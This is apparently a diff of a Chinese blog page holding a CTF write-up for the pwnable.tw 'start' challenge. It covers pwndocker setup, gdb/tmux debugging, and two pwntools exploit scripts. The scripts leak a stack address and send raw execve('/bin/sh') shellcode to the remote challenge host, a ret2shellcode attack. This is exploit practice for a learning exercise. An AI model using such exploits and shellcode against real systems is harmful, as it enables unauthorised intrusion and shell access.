@@ -75,7 +75,7 @@
         		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
             	<ul class="sb-submenu">
 				  	
-				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(23)</small></a></li>
+				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(22)</small></a></li>
 				    
 				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
 				    
@@ -263,19 +263,17 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-rHrPrhlO" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
-
+    <div id="aplayer-CvFyqaTW" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
 <h3><span id="1前言">1）前言</span></h3><p>​        之前看到star大哥开始学pwn力，而且是使用的iterm+pwndocker的环境，觉得非常优雅，便一直想尝试一下，正好最近在研究docker的使用，可以拿来试一试。并且pwndocker也可以十分优雅地指定我们环境的glibc版本，所以是一个非常值得尝试的事。</p>
 <h3><span id="2pwndocker启动">2）pwndocker启动</span></h3><p>​        首先是如何build pwndocker的问题。</p>
 <p>​        如果直接<code>docker pull pwndocker</code>，速度一般会很慢。</p>
-<p>​        这里参考一篇博客的做法：<a target="_blank" rel="noopener" href="https://nocbtm.github.io/2020/02/24/skysider-pwndocker-%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF/#%E5%89%8D%E8%A8%80">skysider/pwndocker 正确使用姿势</a>。</p>
+<p>​        这里参考一篇博客的做法：<a target="_blank" rel="noopener" href="https://nocbtm.github.io/2020/02/24/skysider-pwndocker-正确使用姿势/#前言">skysider/pwndocker 正确使用姿势</a>。</p>
 <p>​        <code>docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0</code>从阿里云上拉取镜像，使得速度变快。</p>
 <p>​        拉取完之后重命名镜像。<code>docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker</code></p>
 <p>​        然后可以</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">--rm \</span><br><span class="line">-h <span class="variable">$&#123;ctf_name&#125;</span> \</span><br><span class="line">--name <span class="variable">$&#123;ctf_name&#125;</span> \</span><br><span class="line">-v $(<span class="built_in">pwd</span>)/<span class="variable">$&#123;ctf_name&#125;</span>:/ctf/work \</span><br><span class="line">-p 23947:23947 \</span><br><span class="line">--cap-add=SYS_PTRACE \</span><br><span class="line">--privileged \</span><br><span class="line">pwn10</span><br></pre></td></tr></table></figure>
-
 <p>​        运行镜像。</p>
-<p>​        但是比较奇怪的是我使用这些指令运行容器并不成功，但是使用<code> docker run -it skysider/pwndocker /bin/bash</code>是能够进入容器并交互的，检查了一下一些环境也比较完善，但是并没有可以操作的二进制文件。    </p>
+<p>​        但是比较奇怪的是我使用这些指令运行容器并不成功，但是使用<code>docker run -it skysider/pwndocker /bin/bash</code>是能够进入容器并交互的，检查了一下一些环境也比较完善，但是并没有可以操作的二进制文件。    </p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-03%20%E4%B8%8B%E5%8D%885.00.25.png" alt="截屏2021-11-03 下午5.00.25"></p>
 <p>​    </p>
 <p>​        我们可以先用<code>docker cp</code>来将题目的文件拷贝至容器中。</p>
@@ -303,13 +301,9 @@
 <p>​        然后就是显然的一个任意地址执行。并且喜闻乐见的NX也没有开启，直接ret2shellcode，把shellcode一股脑丢到栈上执行就行。</p>
 <p>​        shellcode就没必要手写了，<code>pwntools.shallcraft</code>直接生成。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span></span><br><span class="line">payload += shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
 <p>​    摸了一圈，又EOF力。</p>
 <p>​    换了祖传exp。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;chall.pwnable.tw&quot;</span>,<span class="number">10000</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./start&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line">shellcode = <span class="string">b&#x27;\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line"></span><br><span class="line">buf_addr = <span class="number">0xffffd284</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x14</span> </span><br><span class="line">payload += p32(<span class="number">0x8048087</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Let&#x27;s start the CTF:&quot;</span>,payload)</span><br><span class="line">stack_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">20</span></span><br><span class="line">payload += p32(stack_addr+<span class="number">20</span>)</span><br><span class="line">payload += shellcode</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8A%E5%8D%889.49.21.png" alt="截屏2021-11-04 上午9.49.21">    </p>
 <p>​        所以shellcode是没有问题的，问题出在需要溢出两次，一次获得栈地址，一次ret到栈地址执行shellcode。我不能理解。</p>
 <p>​        shellcode覆盖retn，不也是在栈上执行吗，为什么EOF。我猜测是栈空间不够大。虽然但是，不想找wp，喜闻乐见地调试一下吧。</p>
@@ -325,11 +319,11 @@
 <p>​        我傻了。坑是真的多。</p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%885.30.51.png" alt="截屏2021-11-04 下午5.30.51"></p>
 <p>​        果然碰到了无限waiting for debug的问题，虽然pwntools是4.6.1了。</p>
-<p>​        在修改源码后解决问题，详情可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43483799/article/details/118885208?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~default-2.no_search_link">pwntools中使用tmux和gdb attach时Waiting for debugger无限等待的解决方案</a>。</p>
+<p>​        在修改源码后解决问题，详情可以参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43483799/article/details/118885208?spm=1001.2101.3001.6650.2&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-2.no_search_link">pwntools中使用tmux和gdb attach时Waiting for debugger无限等待的解决方案</a>。</p>
 <p>​        解决问题的过程中又发现了一个问题，就是我打开tmux的时候突然就风扇狂转，CPU占用率直接飙到109%，内存3.53G。我以为是容器开太多的问题，把多余的容器全部rm，但是还是不见缓解。</p>
 <p>​        百度后发现这个好像是MAC运行Docker的通病，但是我这个容器至少不应该是这样，因为之前风扇一直就没怎么转，于是我把我现在运行的容器停止，结果cpu占用率一下就变低了，然后再重启，cpu占用率再也没有升高。</p>
 <p>​        对于这个情况我的合理猜测是，那个pwntools源码的无限循环问题。</p>
-<h3><span id><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png"></span></h3><p>​    </p>
+<h3><span id><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.35.02.png" alt></span></h3><p>​    </p>
 <p>​    </p>
 <p>​        尝试了一下一种新的下断点方式。    </p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%887.43.49.png" alt="截屏2021-11-04 下午7.43.49"></p>
@@ -353,9 +347,9 @@
 <p>​        那么如何利用捏。</p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.00.26.png" alt="截屏2021-11-04 下午10.00.26">            </p>
 <p>​        从这里我们可以清楚地看到，这几条指令分别设置了<code>sys_write</code>的参数，真正的参数实际上是字符串“lets start the ctf”，但是我们这里只需要这四条指令。</p>
-<p>​        <code> mov  ecx, esp</code>将当前栈顶的值赋给ecx，作为函数输出的东西的参数。其他的参数这里我们不必关心。</p>
+<p>​        <code>mov  ecx, esp</code>将当前栈顶的值赋给ecx，作为函数输出的东西的参数。其他的参数这里我们不必关心。</p>
 <p>​        </p>
-<p>![截屏2021-11-04 下午10.13.28](/Users/rin/Library/Application Support/typora-user-images/截屏2021-11-04 下午10.13.28.png)        </p>
+<p><img src="/Users/rin/Library/Application Support/typora-user-images/截屏2021-11-04 下午10.13.28.png" alt="截屏2021-11-04 下午10.13.28">        </p>
 <p>​        其实从第一个执行流的ret开始前，清栈已经完成，此时栈顶是下一条需要执行的指令的地址，后面就都是栈上的一些环境变量。</p>
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-04%20%E4%B8%8B%E5%8D%8810.11.55.png" alt="截屏2021-11-04 下午10.11.55"></p>
 <p>​        当我们的程序执行流回到0x8048087。被write出来的其实就是栈顶的地址。</p>
